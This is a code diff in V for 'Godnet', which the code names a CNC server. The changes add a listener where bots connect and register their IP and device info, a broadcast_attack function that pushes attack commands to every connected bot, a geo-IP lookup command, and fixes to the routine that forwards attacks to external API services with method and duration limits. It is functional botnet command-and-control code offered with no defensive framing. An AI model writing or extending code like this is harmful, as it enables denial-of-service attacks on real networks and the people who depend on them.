@@ -49,13 +49,25 @@ pub struct Client
 		method		string
 }
 
+pub struct Bot 
+{
+	pub mut:
+		nickname	string
+		info		[]string // os, arch, cpu, ram etc
+		ip			string // 
+		port		int
+		socket		net.TcpConn
+}
+
 pub struct Godnet
 {
 	pub mut:
 		socket		net.TcpListener
+		bot_sock	net.TcpListener
 		port 		int
 
 		/* Database && Configuration Information */
+		bots		[]Bot
 		apis		[]gn.API
 		users 		[]gn.User
 		clients		[]Client
@@ -71,7 +83,8 @@ fn main()
 	}
 
 	mut g := start_godnet(args[1].int())
-	g.listener()
+	listener(mut &g)
+
 	time.sleep(time.infinite)
 }
 
@@ -110,14 +123,25 @@ fn start_godnet(port int) Godnet
 	println("${gn.success_sym} APIs completed loaded up.....\r\n${gn.success_sym} Starting Godnet server.....!")
 
 	g.socket = net.listen_tcp(.ip6, ":666") or {
-		println("[ X ] Error, Unable to start Godnet CNC....")
+		println("${gn.failed_sym} Error, Unable to start Godnet CNC....")
 		return g
 	}
+
+	println("${gn.success_sym} Godnet server successfully started.....!")
+
+	g.bot_sock = net.listen_tcp(.ip6, ":420") or { 
+		println("${gn.failed_sym} Error, Unable to start Godnet's bot server....")
+		return g
+	}
+
+	println("${gn.success_sym} Godnet bot server successfully started.....!")
+
+	spawn bot_listener(mut &g)
 
 	return g
 }
 
-fn (mut g Godnet) listener()
+fn listener(mut g Godnet)
 {
 	for 
 	{
@@ -130,13 +154,44 @@ fn (mut g Godnet) listener()
 	}
 }
 
+fn bot_listener(mut g Godnet)
+{
+	for {
+		mut bot_c := g.bot_sock.accept() or {
+			println("[ X ] Error, Unable to accept bot connection")
+			&net.TcpConn{}
+		}
+		bot_c.set_read_timeout(time.infinite)
+		spawn g.bot_handler(mut bot_c)
+	}
+}
+
+fn (mut g Godnet) bot_handler(mut bot_c net.TcpConn)
+{
+	mut bot_reader 	:= io.new_buffered_reader(reader: bot_c)
+	bot_ip 			:= bot_c.peer_ip() or { "" }
+
+	secret_key		:= bot_reader.read_line() or { "" }
+	device_info 	:= bot_reader.read_line() or { "" }
+
+	// validate auth
+	g.bots << Bot{ nickname: gn.randomized_text(15),
+				   ip: bot_ip,
+				   port: 0, 
+				   socket: bot_c }
+
+	println("Bot has been added! ${g.bots} ${secret_key} ${device_info}")
+}
+
 fn (mut g Godnet) authorize_user(mut client net.TcpConn)
 {
 	mut reader := io.new_buffered_reader(reader: client)
 	mut user_ip := client.peer_ip() or { "" }
 	gn.loading_bar(mut client)
 	
-	client.write_string("${gn.clear}${gn.c_red}${banner}${gn.c_default}") or { 0 }
+	// client.write_string("${gn.clear}${gn.c_red}${banner}${gn.c_default}") or { 0 }
+
+	gn.animate_listed_text(mut client, "${gn.c_red}${banner}${gn.c_default}", 150)
 	gn.animate_text(mut client, "${gn.bg_red}${gn.c_white}└►Username:${gn.c_default}${gn.bg_default} ", 60)
 	username := reader.read_line() or { "" }
 
@@ -180,7 +235,7 @@ pub fn (mut g Godnet) input_handler(mut c Client)
 
 		// execute action when received more than one argument ofc
 		// invalid arguments or data are checked above!
-		if r.args.len > 1 { 
+		if r.args.len > 0 {
 			g.execute_action(mut c, r)
 		}
 	}
@@ -196,12 +251,23 @@ pub fn (mut g Godnet) execute_action(mut c Client, r gn.Command)
 	match r.cmd 
 	{
 		"geo" {
-
+			if r.args.len != 2 {
+				c.socket.write_string("[ X ] Error, Invalid arguments provided\r\nUsage geo <ip>") or { 0 }
+				return
+			}
+			c.socket.write_string("Geo Location For ${r.args[1]}\r\n${g.geo_ip(r.args[1])}") or { 0 }
+			return 
 		}
 		"attack" {
-
-			c.info.authorize_attack([r.args[1], r.args[2], r.args[3], r.args[8]])
+			c.info.authorize_attack([r.args[1], r.args[2], r.args[3], r.args[4]])
 		} else {}
+	}
+}
+
+pub fn (mut g Godnet) broadcast_attack(data string)
+{
+	for bot in g.bots {
+		bot.socket.write_string("${data}\n") or { 0 }
 	}
 }
 
@@ -252,10 +318,10 @@ pub fn (mut g Godnet) send_attack(mut c Client)
 	for api in g.apis
 	{
 		// If method used not in API, Skip
-		if c.methods !in api.methods { continue }
+		if c.method !in api.methods { continue }
 
 		// if time used over the API's max time, Skip
-		if c.time > api.max_time { 
+		if c.time.int() > api.max_time { 
 			responses += "[ X ] Error, Unable to send to ${api.name} due to the time being over the API's maximum attack time!\r\n"
 			continue 
 		}
@@ -271,4 +337,9 @@ pub fn (mut g Godnet) send_attack(mut c Client)
 
 		responses += "[ + ] Attack successfully sent to ${api.name}\r\n"
 	}
+}
+
+pub fn (mut g Godnet) geo_ip(ip string) string
+{
+	return http.get_text("http://ip-api.com/json/${ip}").replace("{", "").replace("}", "").replace(": ", ":").replace("\",\"", "\r\n").replace("','", "\r\n").replace(":", ": ").replace("\"", "") + "\r\n"
 }
